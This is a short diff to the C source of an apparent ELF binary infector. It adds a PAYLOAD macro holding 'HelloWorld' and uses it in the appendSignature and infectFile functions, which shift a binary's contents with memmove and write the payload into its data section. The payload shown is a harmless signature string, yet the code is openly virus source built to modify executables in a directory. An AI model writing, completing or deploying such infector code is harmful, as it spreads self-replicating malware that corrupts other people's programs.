@@ -11,6 +11,7 @@ static void  start(void) {}
 #include <elf.h>
 
 #define BUF_SIZE 1024
+#define PAYLOAD "HelloWorld"
 
 typedef off_t off64_t;
 typedef ino_t ino64_t;
@@ -25,7 +26,6 @@ struct  linux_dirent {
 static void end(void);
 static int  infectBins(const char *dirname);
 
-// TODO Payload must be aligned on 16
 int   entry_point(void *magic) {
   /* size_t  i; */
   // TODO Array of string
@@ -304,7 +304,7 @@ static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
 static void  appendSignature(struct bfile file, size_t offset) {
   size_t  toAdd;
 
-  char payload[] = "HelloWorldaaaaa";
+  char payload[] = PAYLOAD;
   toAdd = strlen(payload) + 1;
   memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
   memcpy(((void *)file.header) + offset, payload, toAdd);
@@ -367,7 +367,7 @@ static int  infectFile(struct bfile bin) {
   Elf64_Shdr  *data;
   Elf64_Off   offset;
 
-  char payload[] = "HelloWorldaaaaa";
+  char payload[] = PAYLOAD;
   len = strlen(payload);
   data = getDataSectionHeader(bin.header);
   offset = data->sh_offset;
